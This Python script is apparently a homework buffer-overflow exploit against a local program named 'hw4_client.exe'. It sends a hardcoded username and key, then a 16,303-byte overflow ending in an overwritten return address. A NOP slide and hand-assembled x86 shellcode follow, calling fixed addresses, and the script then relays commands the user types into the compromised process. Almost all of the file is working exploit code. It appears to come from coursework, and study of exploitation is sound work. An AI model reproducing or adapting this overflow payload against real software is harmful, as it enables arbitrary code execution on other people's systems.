from subprocess import Popen, PIPE, STDOUT
from time import sleep
if __name__ == '__main__':
    fw_in = open("input.txt", "r")
    p = Popen(['hw4_client.exe'], stdin=PIPE)
    introduction = b"archer\n2BBVAFEX2RNFB2NF\nPEEK\n"
    override = b"\x00" + b"a" * 16303 + b'\x28\x20\x50\x62'
    # package = b"\xeb\x20\x90\x90\xe8\xdc\x5f\x00"
    # package += b"\x90" * 32
    nops_slide = [0xeb, 0x20, 0x90, 0x90, 0xe8, 0xdc, 0x5f, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                  0x90, 0x90, 0x90, 0x90, 0x90]
    package = bytes(nops_slide)
    package += b"\x81\xEC\x00\x40\x00\x00"
    package += b"\x89\xE2"
    package += b"\x52"
    package += b"\x68\x68\x61\x50\x62"
    package += b"\xBF\xD4\x4B\x50\x62"
    package += b"\xFF\xD7"
    package += b"\x6A\x00"
    package += b"\x68\x80\x80\x50\x62"
    package += b"\x52"
    package += b"\x6A\x07"
    package += b"\x8B\x55\x08"
    package += b"\x52"
    package += b"\xBF\x92\x18\x50\x62"
    package += b"\xFF\xD7"
    package += b"\x83\xc4\x1c"
    package += b"\xEB\xD7"
    p.stdin.write(bytearray(introduction + override + package + b"\n"))
    p.stdin.flush()
    user_input = ""
    while user_input != "exit":
        user_input = input("Enter command:")
        # user_input = fw_in.readline()
        p.stdin.write(bytearray(b"\n"+user_input.encode()+b"\n"))
        sleep(1)


    p.kill()
